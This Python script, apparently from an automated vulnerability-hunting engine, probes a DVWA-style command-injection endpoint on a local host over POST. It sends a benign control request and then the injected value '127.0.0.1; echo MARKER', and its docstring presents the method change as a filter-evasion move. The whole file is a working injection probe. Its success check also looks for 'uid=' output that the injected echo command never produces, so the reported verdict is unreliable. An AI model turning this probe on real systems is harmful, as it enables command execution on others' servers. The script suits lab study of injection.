#!/usr/bin/env python3
"""explore_methodtamper.py — NEW PROCESS (brain-explore-v1, 29 Oct ~19:57 IST).

WHY THIS PROCESS EXISTS (reason, owner refinement #1): the playbook's
command-injection probe used GET. A real elite hunter's next thought is:
"the sink reads 'ip' — does it care about the METHOD?" Method-based filter
evasion is a classic lateral move: POST the same injection to the same
endpoint.

Self-contained: fixed marker argv[1], control (benign POST shows no marker),
fixed VERDICT line LAST (engine VERDICT_RE).
"""
import sys
import urllib.parse
import urllib.request

MARKER = sys.argv[1] if len(sys.argv) > 1 else "MTM7719-EXP2"
BASE = "http://172.17.0.1:3100"
TIMEOUT = 25
PATH = "/vulnerabilities/exec/"


def post(ip_value):
    data = urllib.parse.urlencode({"ip": ip_value, "Submit": "Submit"}).encode()
    req = urllib.request.Request(BASE + PATH, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=TIMEOUT) as r:
            return r.read().decode("utf-8", "replace")
    except Exception as e:
        return f"TRANSPORT_ERROR: {e}"


print("METHODTAMPER-EXPLORE-START marker=%s" % MARKER)

# CONTROL: benign POST must NOT echo our marker (oracle is sound).
ctrl = post("127.0.0.1")
ctrl_ok = MARKER not in ctrl
print("CONTROL benign-POST marker-absent=%s" % ctrl_ok)

# ATTACK: same injection the playbook proved via GET, now via POST.
attack = post("127.0.0.1; echo %s" % MARKER)
hit = MARKER in attack and "uid=" in attack
print("ATTACK POST ip='127.0.0.1; echo %s' marker-echoed=%s uid-leaked=%s"
      % (MARKER, MARKER in attack, "uid=" in attack))

if ctrl_ok and hit:
    print("EVIDENCE: command injection works over POST (marker '%s' echoed "
          "and uid= leaked) — the sink is method-agnostic; a GET-only filter "
          "would miss this." % MARKER)
    print("VERDICT: CONFIRMED")
else:
    print("REASON: control-ok=%s post-injection-hit=%s — the sink is not "
          "reachable via POST tampering." % (ctrl_ok, hit))
    print("VERDICT: FAILED")
